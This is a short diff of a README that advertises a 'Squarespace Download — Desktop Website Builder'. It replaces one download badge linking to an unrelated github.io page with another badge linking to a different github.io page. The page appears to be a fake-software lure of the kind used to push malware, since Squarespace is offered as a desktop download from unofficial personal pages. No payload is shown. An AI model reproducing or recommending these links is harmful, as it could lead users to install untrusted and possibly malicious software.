@@ -1,11 +1,6 @@
 # Squarespace Download — Desktop Website Builder
 
-<a href="https://prog-git-app.github.io/.github/?offer=Squarespace" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Get%20Squarespace%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Get Squarespace GitHub">
-</a>
+[![GET Squarespace Website](https://img.shields.io/badge/GET%20%E2%80%94%20Squarespace-Website-0078D6?style=for-the-badge&logoColor=white)](https://kimberlybrownt350.github.io/.github/Squarespace-Website)
 
 ---
 
